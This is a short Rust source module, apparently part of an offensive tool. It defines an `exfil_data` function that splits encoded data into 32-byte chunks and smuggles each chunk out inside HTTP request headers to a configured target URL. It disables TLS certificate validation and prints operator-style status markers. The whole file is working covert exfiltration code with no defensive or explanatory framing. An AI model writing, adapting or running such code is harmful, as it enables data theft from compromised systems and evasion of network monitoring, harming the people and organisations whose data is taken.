use std::error::Error;
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use std::time::Duration;
use std::cmp::min;

mod config {
    include!(concat!(env!("OUT_DIR"), "/config.rs"));
}

async fn send_data(client: &reqwest::Client, encoded_chunk: &str) -> Result<(), Box<dyn Error>> {
    #[cfg(feature = "debug")]
    println!("[*] Sending chunk: {}", encoded_chunk);

    let mut headers = HeaderMap::new();
    for (key, value) in config::HEADERS {
        let header_name = HeaderName::from_bytes(key.as_bytes())?;
        let header_value = HeaderValue::from_str(&value.replace("{{PAYLOAD}}", encoded_chunk))?;
        headers.insert(header_name, header_value);
    }

    let res = client
        .get(config::TARGET_URL)
        .headers(headers)
        .send()
        .await;

    match res {
        Ok(_) => {
            #[cfg(feature = "debug")]
            println!("[+] Sent");
        }
        Err(e) => {
            if e.is_timeout() {
                println!("[-] Request timed out.");
            } else if e.is_connect() {
                println!("[-] Connection error.");
            } else {
                println!("[-] An unknown error occurred: {}", e);
            }
        }
    }

    Ok(())
}

pub async fn exfil_data(encoded_data: &str) -> Result<(), Box<dyn Error>> {
    const CHUNK_SIZE: usize = 32;

    let client = reqwest::Client::builder()
        .http1_title_case_headers()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_millis(500))
        .build()?;

    let mut start = 0;
    while start < encoded_data.len() {
        let end = min(start + CHUNK_SIZE, encoded_data.len());
        send_data(&client, &encoded_data[start..end]).await?;
        start = end;
    }

    Ok(())
}
